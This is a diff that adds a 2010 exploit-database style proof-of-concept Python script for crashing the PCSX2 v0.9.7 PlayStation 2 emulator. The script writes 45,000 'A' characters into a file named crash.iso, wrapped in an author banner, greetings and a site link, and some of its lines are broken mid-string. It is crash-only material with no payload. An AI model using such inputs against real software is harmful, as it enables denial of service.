@@ -1,0 +1,34 @@
+# Exploit Title: PCSX2 v0.9.7 Crash
+# Date: 08/11/2010
+# Author: 41.w4r10r
+# Version: 0.9.7
+
+#Tested on : Windows XP SP2 Eng
+# Software Link: http://pcsx2.net/downloads.php?p=publicbeta
+
+#!/usr/bin/python
+#PCSX2 is PS2 emulator to play PS2 Games on PC. This emulator is one of the
+populer among the gamers.(It Works). PS2 Bios required to run this games.
+print "--------------------Exploit By
+41.w4r10r------------------------------\n"
+print "-------------------41.w4r10r@gmail.com-----------------------------
+\n"
+print "----------------PCSX2 v0.9.7 PS2
+Emulator------------------------------\n"
+print "-------------Vendor Site :
+http://pcsx2.net/-------------------------\n"
+print "-------------Tested on Windows XP Sp2 Eng--------------------\n"
+print "Greets: B0nd, nEo, Godwin_Austin, Fb1H2s, Eberly, Punter, The_Empty,
+vinnu, primary_key , Micr0 \n \n"
+print "  Catch Us :  www.Garage4hackers.com \n \n"
+
+print "Give Me 10Sec To create file :) \n"
+junk = "A" * 45000;
+filename = "crash.iso";
+file = open(filename,"w")
+file.writelines(junk)
+file.close()
+print "File Is created"
+print "Press Any Key To Continue........."
+
+raw_input()
